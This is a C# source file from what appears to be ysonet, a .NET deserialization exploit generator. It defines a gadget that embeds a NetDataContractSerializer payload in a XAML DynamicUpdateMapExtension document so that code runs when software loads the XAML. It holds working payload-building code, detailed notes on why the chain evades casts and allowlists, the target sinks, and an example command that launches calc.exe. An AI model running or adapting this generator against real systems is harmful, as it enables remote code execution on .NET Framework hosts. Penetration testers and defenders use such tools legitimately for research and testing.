using System;
using System.Collections.Generic;
using System.Text;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /// <summary>
    /// System.Activities.XamlIntegration.DynamicUpdateMapExtension turns a plain XAML sink into
    /// a full NetDataContractSerializer sink. It is a PUBLIC MarkupExtension with a public
    /// parameterless constructor, and its content property hands the attacker's XML straight to
    /// NDCS (System.Activities.dll, decompiled):
    ///
    ///     [ContentProperty("XmlContent")]
    ///     public class DynamicUpdateMapExtension : MarkupExtension
    ///     {
    ///         private NetDataContractXmlSerializable&lt;DynamicUpdateMap&gt; content;
    ///
    ///         public IXmlSerializable XmlContent
    ///         {
    ///             get
    ///             {
    ///                 if (content == null)
    ///                     content = new NetDataContractXmlSerializable&lt;DynamicUpdateMap&gt;();
    ///                 return content;
    ///             }
    ///         }
    ///     }
    ///
    ///     internal class NetDataContractXmlSerializable&lt;T&gt; : IXmlSerializable where T : class
    ///     {
    ///         public void ReadXml(XmlReader reader)
    ///         {
    ///             NetDataContractSerializer netDataContractSerializer = CreateSerializer();
    ///             Value = (T)netDataContractSerializer.ReadObject(reader);
    ///         }
    ///
    ///         private NetDataContractSerializer CreateSerializer()
    ///         {
    ///             return new NetDataContractSerializer { AssemblyFormat = FormatterAssemblyStyle.Simple };
    ///         }
    ///     }
    ///
    /// No SerializationBinder, no DataContractResolver, no KnownTypes: whatever z:Type/z:Assembly
    /// the inner document names is what gets built. So every NetDataContractSerializer gadget in
    /// this tool becomes reachable through a host that only ever parses XAML.
    ///
    /// FOUR FACTS THAT SHAPE THE PAYLOAD BELOW.
    ///
    /// 1. THE INNER DOCUMENT MUST SIT INSIDE &lt;x:XData&gt;, and that is the whole trick.
    ///    System.Xaml's scanner only treats markup as literal XML when the element is the XAML
    ///    language's XData element (MS.Internal.Xaml.Parser.XamlScanner.IsXDataElement, which
    ///    compares against XamlLanguage.XData); it then calls XmlReader.ReadInnerXml and emits
    ///    the text as an XData value. Nesting the NDCS document directly under the property
    ///    element instead makes the parser try to resolve its root element (ArrayOfstring,
    ///    SortedSet, ...) as a XAML type in the serialization namespace, and the payload dies
    ///    there without ever reaching ReadXml. This is the single detail that decides whether
    ///    this gadget works at all.
    ///
    /// 2. A READ-ONLY PROPERTY IS FINE HERE, which is unusual. XamlObjectWriter's
    ///    Logic_ApplyPropertyValue checks "is the value an XData and is the member's type
    ///    IXmlSerializable" (XamlType.LookupIsXData = CanAssignTo(IXmlSerializable)) BEFORE it
    ///    ever looks for a setter, and then calls ClrObjectRuntime.SetXmlInstance, which READS
    ///    the property and calls ReadXml on the value it got back. The lazy getter above builds
    ///    the NetDataContractXmlSerializable for us, so no setter is needed and none exists.
    ///
    /// 3. THE CAST HAPPENS TOO LATE TO PROTECT ANYTHING. ReadXml casts the result to
    ///    DynamicUpdateMap only AFTER ReadObject returns, so the inner gadget has already run
    ///    by the time the InvalidCastException is raised. A failed load is the normal outcome
    ///    of this payload, not a sign that it did nothing.
    ///
    /// 4. XAML IS THE ONLY FORMATTER, and the reason is structural rather than unexplored.
    ///    See SupportedFormatters().
    ///
    /// Target sinks: anything that parses attacker XAML with the DEFAULT schema context -
    /// XamlServices.Load, ActivityXamlServices.Load (.xamlx workflow files), WorkflowDesigner
    /// .Load(fileName), System.Windows.Markup.XamlReader.Load. DynamicUpdateMapExtension is a
    /// well known framework type, so a type allowlist written around "the workflow types are
    /// fine" permits it.
    ///
    /// WHERE IT DOES NOT LAND, measured: the restrictive reader behind the CVE-2020-0605/0606
    /// mitigation (System.Windows.Markup.RestrictiveXamlXmlReader, used by the WPF clipboard and
    /// XPS sinks) drops this payload. Its five named types are a red herring -
    /// IsRestrictedType is really an ALLOWLIST that keeps only a DependencyObject subclass in the
    /// System.Windows[.*] namespace, a primitive, or a registry-allowed type, and skips every
    /// other subtree. It does so SILENTLY: no exception, nothing built, no effect. That is a
    /// property of that one reader, not of XamlServices or ActivityXamlServices.
    ///
    /// The payload template lives in this file. The inner NDCS document does not: this gadget
    /// is a BRIDGE CONSUMER, so the inner payload is whichever NetDataContractSerializer gadget
    /// the operator chained in with -bgc, and TypeConfuseDelegate through the declared
    /// GenerateInner hand-off when they chained nothing.
    /// </summary>
    public class DynamicUpdateMapExtensionGenerator : GenericGenerator
    {
        // The gadget feeds a second deserializer (nested-deserialization); what that second
        // deserializer then does is the inner gadget's business, and the default inner is
        // TypeConfuseDelegate, so code execution is the normal outcome.
        //
        // Versions describe the framework the TARGET PROCESS RUNS ON. The floor is 4.5, not
        // 4.0: System.Activities.DynamicUpdate (DynamicUpdateMap, and this extension with it)
        // is the .NET Framework 4.5 workflow dynamic-update feature, and the default inner
        // TypeConfuseDelegate chain is 4.5+ as well. The ceiling is re-earned by this gadget's
        // own rows in PayloadsFireIntoTestSinks.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.NestedDeserialization, PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // System.Activities 4.5-era DynamicUpdate types; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        // Kept short on purpose: this is the FIRST block of the interactive info panel, and a
        // long one pushes the formatter list and the category summary off the visible rows. The
        // detail lives in the class header above and in docs/usage-and-examples.md.
        public override string AdditionalInfo()
        {
            return "DynamicUpdateMapExtension is a public MarkupExtension whose XmlContent hands "
                + "an x:XData section to NetDataContractSerializer.ReadObject with no binder, so a "
                + "XAML-only sink carries any NDCS gadget. Needs System.Activities on the target.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Bridged, GadgetTags.SecondOrderDeserialization };
        }

        /// <summary>
        /// The inner document is read by NetDataContractSerializer, so the bridge takes an NDCS
        /// gadget:
        ///   ysonet.exe -g DynamicUpdateMapExtension -bgc WindowsIdentity -f Xaml -c calc.exe
        /// </summary>
        public override string SupportedBridgedFormatter()
        {
            return Formatters.NetDataContractSerializer;
        }

        /// <summary>
        /// Xaml alone, and every other formatter is out for a structural reason, so none of
        /// them needs re-measuring:
        ///
        ///   THE SINK IS A XAML PARSER FEATURE. Nothing else calls IXmlSerializable.ReadXml on
        ///     this property. It is reached only by XamlObjectWriter's XData handling
        ///     (Logic_ApplyPropertyValue -> ClrObjectRuntime.SetXmlInstance), which no other
        ///     serializer in this tool implements or can be made to implement.
        ///   XmlContent HAS NO SETTER, and its declared type is the IXmlSerializable INTERFACE
        ///     with no members of its own. So the property-assigning serializers (Json.NET,
        ///     JavaScriptSerializer, FastJson, YamlDotNet, both SharpSerializer modes, both
        ///     MessagePack Typeless flavours) have nothing to assign: even where they can carry
        ///     a setter-less member, assigning "some object" to it is not what fires this
        ///     chain - calling ReadXml on it is.
        ///   DynamicUpdateMapExtension IS NOT [Serializable] (Type.IsSerializable is false), so
        ///     BinaryFormatter, SoapFormatter and LosFormatter reject the type before creating
        ///     anything, and FsPickler refuses it during pickler resolution.
        ///   A DATA CONTRACT IS BUILT FROM READ-WRITE MEMBERS, so NetDataContractSerializer,
        ///     DataContractSerializer, DataContractJsonSerializer and XmlSerializer see no
        ///     member at all on this type.
        ///
        /// Reaching this chain from a non-XAML formatter is still possible, and it is done by
        /// CHAINING rather than by widening this list: this gadget's output is a Xaml document,
        /// so it can be the inner payload of any gadget whose SupportedBridgedFormatter() is
        /// Xaml (WorkflowDesigner, TextFormattingRunProperties, ...).
        /// </summary>
        public override List<string> SupportedFormatters()
        {
            return new List<string> { Formatters.Xaml };
        }

        // Consumed by the INNER NetDataContractSerializer payload - the bridged gadget the
        // operator chained in, or the TypeConfuseDelegate default below. This gadget runs
        // nothing itself.
        public override CommandInputType CommandInput()
        {
            return CommandInputType.ShellCommand;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (!IsFormatter(formatter, Formatters.Xaml))
                throw UnsupportedFormatter(formatter);

            string innerNdcs = BridgedInnerNdcs();
            if (innerNdcs == null)
            {
                // Nothing chained in, so build the default inner payload - and that one is what
                // needs -c.
                RequireCommandInput(inputArgs);
                innerNdcs = DefaultInnerNdcs(inputArgs);
            }

            return FinishHandWrittenPayload(BuildPayload(innerNdcs), formatter, inputArgs);
        }

        // The payload of a chained NetDataContractSerializer gadget, or null when the operator
        // chained nothing.
        private string BridgedInnerNdcs()
        {
            return BridgedPayload == null ? null : NdcsDocumentText(BridgedPayload);
        }

        /// <summary>
        /// An NDCS payload as text. GenericGenerator.Serialize returns the
        /// NetDataContractSerializer document as UTF-8 BYTES (it writes into a MemoryStream),
        /// which is what both the bridge and the default inner payload hand over; a string is
        /// accepted as well so a producer that returns one is not rejected.
        /// </summary>
        private string NdcsDocumentText(object payload)
        {
            byte[] bytes = payload as byte[];
            if (bytes != null)
                return Encoding.UTF8.GetString(bytes);
            string text = payload as string;
            if (text != null)
                return text;
            throw new Exception(Name() + " received an inner payload of type "
                + payload.GetType().Name + "; it expects a "
                + Formatters.NetDataContractSerializer + " document.");
        }

        // The default inner payload: TypeConfuseDelegate serialized with
        // NetDataContractSerializer, which is the classic chain this bridge exists to deliver.
        //
        // GenerateInner, never GenerateWithNoTest: this gadget HARDCODES which inner gadget it
        // wraps, so the inner generator must not be handed this module's own --var and friends
        // (see GenericGenerator.GenerateInner). It also skips the inner self-test, so building
        // the payload never fires it here.
        private string DefaultInnerNdcs(InputArgs inputArgs)
        {
            return NdcsDocumentText(new TypeConfuseDelegateGenerator()
                .GenerateInner(Formatters.NetDataContractSerializer, inputArgs));
        }

        /// <summary>
        /// The whole document. The inner NDCS payload is embedded as LITERAL XML, not escaped:
        /// the XAML scanner calls XmlReader.ReadInnerXml on the x:XData element and hands the
        /// markup it read to ReadXml, so the inner document has to stay real markup here.
        /// </summary>
        private string BuildPayload(string innerNdcs)
        {
            // The xmlns takes an assembly NAME, not a display name, so no version or public key
            // token appears here.
            return @"<DynamicUpdateMapExtension xmlns=""clr-namespace:System.Activities.XamlIntegration;assembly=System.Activities"" xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml"">
  <DynamicUpdateMapExtension.XmlContent>
    <x:XData>
" + WithoutXmlDeclaration(innerNdcs) + @"
    </x:XData>
  </DynamicUpdateMapExtension.XmlContent>
</DynamicUpdateMapExtension>";
        }

        /// <summary>
        /// Drop a leading XML declaration from the inner document. ysonet's
        /// NetDataContractSerializer helper writes into a StringBuilder, so its payload starts
        /// with an encoding=utf-16 declaration, and an XML declaration is only legal at the very
        /// start of a document: leaving it in makes the OUTER XAML document unparseable before
        /// anything reaches the target.
        /// </summary>
        private static string WithoutXmlDeclaration(string document)
        {
            string trimmed = (document ?? "").Trim();
            if (!trimmed.StartsWith("<?xml", StringComparison.Ordinal))
                return trimmed;

            int end = trimmed.IndexOf("?>", StringComparison.Ordinal);
            return end < 0 ? trimmed : trimmed.Substring(end + 2).Trim();
        }
    }
}
